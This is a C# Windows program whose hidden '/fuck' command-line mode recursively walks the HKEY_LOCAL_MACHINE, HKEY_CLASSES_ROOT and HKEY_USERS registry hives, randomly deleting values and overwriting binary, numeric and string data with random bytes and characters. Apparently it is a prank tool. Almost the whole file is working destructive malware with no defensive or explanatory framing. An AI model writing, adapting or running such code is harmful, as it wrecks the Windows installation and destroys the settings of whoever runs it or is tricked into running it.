using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace YOUFuck
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            if(args.Length > 0 &&
                args[0] == "/fuck")
            {
                new Fuck().fuck();
                Environment.Exit(0);
            }
            else
            {
                FormsApplication.Run(new Form1(Debugger.IsAttached));
            }
        }
    }
    public class Fuck
    {
        double damage = Math.Pow(2, (100 / (100.0 / 12)) - 12);
        private Random rng = new Random();
        public void fuckReg(RegistryKey key, double dm)
        {
            foreach (var k in key.GetSubKeyNames())
            {
                try
                {
                    fuckReg(key.OpenSubKey(k, true), dm);
                }
                catch (Exception) { }
            }

            foreach (var v in key.GetValueNames())
            {
                try
                {
                    if (rng.NextDouble() <= damage * 0.05 * dm)
                    {
                        key.DeleteValue(v);
                    }
                    else
                    {
                        corruptReg(key, v, dm);
                    }
                }
                catch (Exception) { }
            }
        }

        public int countReg(RegistryKey key)
        {
            int i = key.ValueCount;

            foreach (var k in key.GetSubKeyNames())
            {
                try
                {
                    i += countReg(key.OpenSubKey(k, true));
                }
                catch (Exception) { }
            }

            return i;
        }

        public void corruptReg(RegistryKey key, string value, double dm)
        {
            var v = key.GetValue(value, null, RegistryValueOptions.DoNotExpandEnvironmentNames);

            switch (key.GetValueKind(value))
            {
                case RegistryValueKind.Binary:
                    byte[] arr = (byte[])v;
                    for (int i = 0; i < arr.Length; i++)
                    {
                        if (rng.NextDouble() <= damage * dm)
                        {
                            arr[i] = (byte)rng.Next(0, 256);
                        }
                    }
                    break;

                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    if (rng.NextDouble() <= damage * dm)
                        v = rng.Next();

                    break;

                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    v = corruptString((string)v, dm);
                    break;

                case RegistryValueKind.MultiString:
                    string[] strs = (string[])v;

                    for (int i = 0; i < strs.Length; i++)
                    {
                        strs[i] = corruptString(strs[i], dm);
                    }

                    break;
            }

            key.SetValue(value, v, key.GetValueKind(value));
        }

        public string corruptString(string str, double dm)
        {
            string n = "";

            foreach (char c in str)
            {
                if (rng.NextDouble() <= damage * dm)
                    n += (char)rng.Next(32, 127);
                else
                    n += c;
            }

            return n;
        }
        public void fuck()
        {

            fuckReg(Registry.LocalMachine, 1);
            fuckReg(Registry.ClassesRoot, 1);
            fuckReg(Registry.Users, 1);
        }
    }
}
